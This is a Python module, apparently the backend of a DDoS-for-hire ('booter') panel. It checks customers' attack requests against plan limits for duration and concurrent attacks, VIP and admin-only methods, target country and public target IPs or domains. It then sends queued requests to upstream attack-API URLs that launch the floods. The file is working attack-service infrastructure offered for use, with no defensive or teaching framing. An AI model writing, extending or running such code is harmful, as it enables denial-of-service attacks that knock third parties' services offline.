import time, socket, ipaddress, threading, re, requests, json, traceback
from src.env import env
from src.database import users, attacks
from src.utils import COUNTRIES, findbyuser, log, process
from urllib.parse import urlparse
from collections import deque
from typing import Dict, Any, Optional

# Variáveis globais da fila
attack_queue = deque()
queue_lock = threading.Lock()
is_processing = False

class amc: # attacks manager core
    @staticmethod
    def attack_launcher(url: str):
        try:
            # Faz a requisição GET com timeout
            response = requests.get(url, timeout=10)
            
            # VERIFICAÇÃO 1: Status code HTTP
            if response.status_code not in [200, 302]:
                return {
                    "success": False,
                    "status_code": response.status_code,
                    "error": f"HTTP Error {response.status_code}",
                    "raw_response": response.text[:200] if response.text else "Empty response"
                }
            
            # VERIFICAÇÃO 2: Tenta parsear JSON
            try:
                data = response.json()
            except json.JSONDecodeError:
                return {
                    "success": False,
                    "status_code": response.status_code,
                    "error": "Invalid JSON response",
                    "raw_response": response.text[:200]
                }
            
            # VERIFICAÇÃO 3: Verifica campo 'status' no JSON
            if data.get('status') == 'error':
                error_msg = data.get('message') or data.get('error') or data.get('description') or 'Unknown error'
                return {
                    "success": False,
                    "status_code": response.status_code,
                    "error": error_msg,
                    "data": data
                }
            
            # VERIFICAÇÃO 4: Verifica se existe campo 'message' com erro
            if 'message' in data and 'error' in data['message'].lower():
                return {
                    "success": False,
                    "status_code": response.status_code,
                    "error": data['message'],
                    "data": data
                }
            
            # VERIFICAÇÃO 5: Verifica se existe campo 'error'
            if 'error' in data:
                return {
                    "success": False,
                    "status_code": response.status_code,
                    "error": data['error'],
                    "data": data
                }
            
            # VERIFICAÇÃO 6: Verifica se tem 'attack_id' (sucesso no launch)
            if 'attack_id' in data or data.get('status') == 'success':
                return {
                    "success": True,
                    "status_code": response.status_code,
                    "data": data,
                    "attack_id": data.get('attack_id'),
                    "message": data.get('message', 'Attack launched successfully')
                }
            
            # VERIFICAÇÃO 7: Se chegou aqui, verifica se é um sucesso genérico
            if data.get('status') == 'success':
                return {
                    "success": True,
                    "status_code": response.status_code,
                    "data": data,
                    "message": data.get('message', 'Request successful')
                }
            
            # VERIFICAÇÃO 8: Última verificação - se tem dados e não tem erro
            if data and not any(k in data for k in ['error', 'errors', 'exception']):
                return {
                    "success": True,
                    "status_code": response.status_code,
                    "data": data,
                    "message": "Request processed successfully"
                }
            
            # VERIFICAÇÃO 9: Se não conseguiu determinar, retorna unknown
            return {
                "success": False,
                "status_code": response.status_code,
                "error": "Unknown error - unable to determine response status",
                "data": data
            }
            
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "error": "Connection timeout",
                "status_code": 408,
                "message": "Request timed out after 10 seconds"
            }
            
        except requests.exceptions.ConnectionError:
            return {
                "success": False,
                "error": "Connection error",
                "status_code": 503,
                "message": "Unable to connect to server"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"Unexpected error: {str(e)}",
                "status_code": 500,
                "message": str(e)
            }

    @staticmethod
    def add_attack_to_queue(url: str, callback: Optional[callable] = None) -> int:
        """
        Adiciona um ataque à fila para ser processado
        Retorna o ID do ataque na fila
        """
        with queue_lock:
            attack_id = len(attack_queue)
            attack_queue.append({
                'id': attack_id,
                'url': url,
                'callback': callback,
                'status': 'pending',
                'result': None,
                'timestamp': time.time()
            })
            return attack_id

    @staticmethod
    def process_queue():
        """
        Processa a fila de ataques em background
        """
        global is_processing
        
        
        def worker():
            global is_processing
            while True:
                with queue_lock:
                    if not attack_queue:
                        is_processing = False
                        break
                    
                    attack = attack_queue.popleft()
                
                # Processa o ataque - CORRIGIDO: adicionado amc.
                result = amc.attack_launcher(attack['url'])
                
                # Atualiza resultado
                attack['status'] = 'completed'
                attack['result'] = result
                
                # Chama callback se existir
                if attack['callback']:
                    try:
                        attack['callback'](result)
                    except Exception as e:
                        log(
                            'Attacks Debug',
                            f"Attacks queue error: {e}")
                
                # Mostra resultado
                if result['success']:
                    log('Attacks', f"Attack {attack['id']} sent!")
                else:
                    log('Attacks debug', f"Ataque {attack['id']} falhou: {result.get('error', 'Unknown error')}")
                
                time.sleep(0.25)
        
        # Inicia thread
        with queue_lock:
            if is_processing:
                return
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.name = 'Attacker-Queue'
            thread.start()
            is_processing = True

    @staticmethod
    def send_attack(url: str, callback: Optional[callable] = None) -> int:
        """
        Função principal: adiciona ataque à fila e processa
        """
        # CORRIGIDO: adicionado amc.
        attack_id = amc.add_attack_to_queue(url, callback)
        amc.process_queue()
        return attack_id

    @staticmethod
    def check_blacklist(input_value):
        try:
            value = str(input_value).strip()
            blacklist = env.get("blacklist", [])

            for entry in blacklist:
                if not isinstance(entry, dict):
                    continue

                reason = entry.get(
                    "reason",
                    "Blocked by blacklist"
                )

                # =========================================================
                # STRING
                # =========================================================
                if "string" in entry:
                    pattern = str(entry["string"])

                    regex = "^" + re.escape(pattern).replace(r"\*", ".*") + "$"

                    if re.fullmatch(regex[1:-1], value, re.IGNORECASE):
                        return {
                            "blocked": True,
                            "reason": reason
                        }

                # =========================================================
                # IP PREFIX
                # =========================================================
                if "prefix" in entry and "CIDR" in entry:

                    try:
                        input_ip = ipaddress.ip_address(value)
                    except ValueError:
                        continue

                    try:
                        prefix = entry["prefix"]
                        prefix_len = int(entry["CIDR"])

                        network = ipaddress.ip_network(
                            f"{prefix}/{prefix_len}",
                            strict=False
                        )

                    except (ValueError, TypeError):
                        continue

                    if input_ip.version != network.version:
                        continue

                    if input_ip in network:
                        return {
                            "blocked": True,
                            "reason": reason
                        }

            return {
                "blocked": False,
                "reason": None
            }

        except Exception as exc:
            log("Debug", f"Error checking blacklist: {exc}")

            return {
                "blocked": True,
                "reason": f"Blacklist error: {exc}"
            }

    @staticmethod
    def is_valid_ip(ip):
        try:
            addr = ipaddress.ip_address(ip)
        except ValueError:
            return False

        return not (
            addr.is_private
            or addr.is_loopback
            or addr.is_reserved
            or addr.is_link_local
            or addr.is_multicast
        )

    @staticmethod
    def is_valid_domain(domain):
        try:
            domain = urlparse(domain)
            ip = socket.gethostbyname(domain.netloc)
            return amc.is_valid_ip(ip), domain.netloc
        except (socket.gaierror, ValueError):
            return False, None

    @staticmethod
    def is_admin(user):
        return user in env["users"].get("roots", [])

    @staticmethod
    def is_valid_country(code: str) -> bool:
        VALID_CODES = {code for code, _ in COUNTRIES}
        return code.upper() in VALID_CODES

    @staticmethod
    def validate_method(method):
        return env['funnel']['methods'].get(method, None)

    @classmethod
    def validate_job(
        cls,
        user,
        method,
        host,
        duration,
        port=0,
        concurrents=1,
        length=0,
        rps=0,
        geolocation=0,
    ):
        """
        validates runs attacks.
        """
        userdata = findbyuser(user)
        if not userdata:
            log(
                "Attack manager",
                f"A unlogged user({user}) tried to launch a attack!"
                )
            return False, 'error'
        
        method_info = cls.validate_method(method)

        if method_info is None:
            return False, "Method not found."

        moderation = method_info.get("moderation", {})

        # --------------------------------------------------------
        # Basic values
        # --------------------------------------------------------

        if not isinstance(duration, int) or duration <= 0:
            return False, "Invalid duration."

        if not isinstance(concurrents, int) or concurrents <= 0:
            return False, "Invalid concurrent count."

        if not isinstance(port, int) or not 0 <= port <= 65535:
            return False, "Invalid port."

        if not isinstance(length, int) or length < 0:
            return False, "Invalid length."

        # --------------------------------------------------------
        # Duration
        # --------------------------------------------------------

        if duration > userdata['boottime']:
            return False, (
                f"Maximum duration on your plan is "
                f"{moderation['max_time']} seconds."
            )

        if (
            moderation.get("limit_attack_time")
            and duration > moderation.get("max_time", duration)
        ):
            return False, (
                f"Maximum duration for this method is "
                f"{moderation['max_time']} seconds."
            )

        minimum_time = env['funnel'].get("minimum_time", 0)

        if duration < minimum_time:
            return False, (
                f"Minimum duration for this method is "
                f"{minimum_time} seconds."
            )

        # --------------------------------------------------------
        # Concurrents
        # --------------------------------------------------------

        current = attacks.count(
                user=user,
                running_only=True,
            )
        cnccurrent = attacks.count(
                running_only=True,
            )
        if cnccurrent >= env['funnel']['maximum_concurrents_on_cnc']:
            return False, "max cnc concurrency limit reached."

        if current + concurrents > userdata['concurrents']:
            return False, "max concurrency limit reached."

        user_limit = moderation.get("limit_concs_per_user")

        if user_limit is not None:
            current = attacks.count(
                user=user,
                method=method,
                running_only=True,
            )

            if current + concurrents > user_limit:
                return False, "User concurrency limit reached."

        cnc_limit = moderation.get("limit_concs_on_cnc")

        if cnc_limit is not None:
            current = attacks.count(
                method=method,
                running_only=True,
            )

            if current + concurrents > cnc_limit:
                return False, "Global concurrency limit reached."

        # --------------------------------------------------------
        # Length
        # --------------------------------------------------------

        allow_length = moderation.get("allow_length", False)

        if not allow_length and length != 0:
            return False, "Length parameter is not allowed."

        if allow_length:
            max_length = moderation.get("max_lenght")

            if max_length is not None and length > max_length:
                return False, (
                    f"Maximum length is {max_length}."
                )

        # --------------------------------------------------------
        # Host
        # --------------------------------------------------------
        domain = None
        if moderation.get("just_ips") or not moderation.get("just_domains"):
            if not cls.is_valid_ip(host):
                return False, "Only valid public IPs are allowed."
        elif moderation.get("just_domains"):
            valid, domain = cls.is_valid_domain(host)
            if not valid:
                return False, "Only valid public domains are allowed."

        blacklisted = amc.check_blacklist(host if not domain else domain)
        if blacklisted.get('blocked'):
            return False, blacklisted.get('reason')

        # --------------------------------------------------------
        # Geolocations
        # --------------------------------------------------------

        if geolocation != 0 and not cls.is_valid_country(geolocation):
            return False, "Only (valid) countries codes are accepted."
        
        # --------------------------------------------------------
        # Permissions
        # --------------------------------------------------------

        if 'admin' in method_info.get("permissions", []) and not cls.is_admin(user):
            return False, "Administrator permission required."

        if 'vip' in method_info.get("permissions", []) and not userdata['vip']:
            return False, "VIP permission required."

        # --------------------------------------------------------
        # Default port
        # --------------------------------------------------------

        if port == 0:
            port = moderation.get("default_port", 0)

        try:
            atk, atkid = attacks.add(user, method, host, port, concurrents, end_time=int(time.time())+duration+1)
            results = {
                    "status": 'success',
                    "id": atkid,
                    "method": method,
                    "host": host,
                    "port": port,
                    "duration": duration,
                    "concurrents": concurrents,
                    "length": length,
                    "rps": rps,
                    "geolocation": geolocation,
                }
            if atk:
                for i in method_info.get('api', []):
                    for _ in range(concurrents):
                        amc.send_attack(process(i, is_attack=results))
                return True, results
            else:
                return False, {
                    'status': 'Database failed to insert the attack'
                }
        except Exception as e:
            log(
                "Debug",
                f"Error on attack validator/scheduler: {traceback.format_exc()}"
            )
            return False, {
                'status': f'Database error: {str(e)}'
            }